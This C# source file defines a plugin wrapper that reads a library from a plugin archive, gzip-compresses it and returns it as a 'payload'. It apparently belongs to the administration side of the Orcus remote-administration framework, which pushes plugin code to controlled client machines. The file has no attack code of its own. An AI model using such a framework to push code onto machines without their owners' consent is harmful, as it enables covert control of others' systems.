using System.IO;
using System.IO.Compression;
using System.Windows.Media.Imaging;
using Orcus.Plugins;

namespace Orcus.Administration.Core.Plugins.Wrappers
{
    public class ClientPlugin : IPayload
    {
        public ClientPlugin(string path, PluginInfo pluginInfo, BitmapImage thumbnail,
            Orcus.Plugins.ClientController plugin)
        {
            Path = path;
            PluginInfo = pluginInfo;
            Thumbnail = thumbnail;
            Plugin = plugin;

            using (var fs = new FileStream(Path, FileMode.Open, FileAccess.Read))
            using (var archive = new ZipArchive(fs, ZipArchiveMode.Read))
            using (var zipStream = archive.GetEntry(PluginInfo.Library1).Open())
            using (var ms = new MemoryStream())
            {
                using (var gzip = new GZipStream(ms, CompressionMode.Compress, true))
                {
                    zipStream.CopyTo(gzip);
                }
                Size = ms.Length;
            }
        }

        public Orcus.Plugins.ClientController Plugin { get; }
        public string Path { get; }
        public PluginInfo PluginInfo { get; }
        public BitmapImage Thumbnail { get; }
        public long Size { get; }

        public byte[] GetPayload()
        {
            using (var fs = new FileStream(Path, FileMode.Open, FileAccess.Read))
            using (var archive = new ZipArchive(fs, ZipArchiveMode.Read))
            using (var zipStream = archive.GetEntry(PluginInfo.Library1).Open())
            using (var ms = new MemoryStream())
            {
                using (var gzip = new GZipStream(ms, CompressionMode.Compress, true))
                {
                    zipStream.CopyTo(gzip);
                }
                return ms.ToArray();
            }
        }
    }
}